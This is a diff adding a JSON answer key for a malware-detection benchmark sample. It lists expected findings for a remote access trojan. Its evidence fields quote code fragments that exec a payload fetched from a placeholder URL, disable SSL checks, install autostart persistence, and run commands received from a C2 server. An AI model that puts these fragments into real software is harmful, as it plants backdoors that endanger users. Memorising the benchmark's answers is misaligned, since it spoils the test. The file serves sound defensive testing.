@@ -1,0 +1,85 @@
+{
+  "sample_id": "adv-031-remote-loading",
+  "test_category": "dynamic_code_obfuscation",
+  "benchmark_marker": "BENCHMARK_TEST_ONLY",
+  "expected_detections": [
+    {
+      "detection_id": "DYNAMIC-007",
+      "detection_name": "Remote code loading",
+      "description": "Fetching and executing code from remote URLs",
+      "severity": "critical",
+      "confidence": 0.98,
+      "evidence": [
+        "exec(urllib.request.urlopen(\"https://[REDACTED].example.com/payload.py\").read())",
+        "response = urllib.request.urlopen(url); code = response.read(); exec(code)",
+        "exec(stage1_code, namespace)"
+      ]
+    },
+    {
+      "detection_id": "SSL-001",
+      "detection_name": "SSL verification disabled",
+      "description": "Disabling SSL certificate verification to allow MITM attacks",
+      "severity": "high",
+      "confidence": 0.95,
+      "evidence": [
+        "ssl_context.check_hostname = False",
+        "ssl_context.verify_mode = ssl.CERT_NONE"
+      ]
+    },
+    {
+      "detection_id": "PERSIST-002",
+      "detection_name": "Persistence mechanism",
+      "description": "Installing backdoor to autostart directory",
+      "severity": "critical",
+      "confidence": 0.97,
+      "evidence": [
+        "persist_path = os.path.join(home, \".config\", \"autostart\", \"updater.py\")",
+        "os.chmod(persist_path, 0o755)"
+      ]
+    },
+    {
+      "detection_id": "C2-001",
+      "detection_name": "Command and control communication",
+      "description": "Beaconing to C2 server and executing received commands",
+      "severity": "critical",
+      "confidence": 0.96,
+      "evidence": [
+        "urllib.request.Request(f\"{self.c2_url}/beacon\"...)",
+        "if command.get(\"type\") == \"exec\": exec(command[\"payload\"])"
+      ]
+    },
+    {
+      "detection_id": "EXFIL-005",
+      "detection_name": "System information collection",
+      "description": "Collecting and sending system information to attacker",
+      "severity": "high",
+      "confidence": 0.93,
+      "evidence": [
+        "hostname: os.uname().nodename",
+        "user: os.environ.get(\"USER\")",
+        "cwd: os.getcwd()"
+      ]
+    },
+    {
+      "detection_id": "STEALTH-001",
+      "detection_name": "Background execution",
+      "description": "Running malicious code in daemon thread",
+      "severity": "high",
+      "confidence": 0.90,
+      "evidence": [
+        "threading.Thread(target=background_exec, daemon=True)"
+      ]
+    }
+  ],
+  "obfuscation_techniques": [
+    "Remote code loading bypasses static analysis",
+    "Multi-stage payload loading",
+    "SSL verification bypass",
+    "Daemon thread execution",
+    "Disguised as legitimate loader utility"
+  ],
+  "risk_score": 9.9,
+  "verdict": "确认恶意",
+  "verdict_reasoning": "Complete remote access trojan (RAT) implementation including remote code loading, C2 beaconing, command execution, and persistence installation. SSL verification bypass enables MITM attacks. Represents full malware capability.",
+  "recommended_action": "block_and_alert"
+}
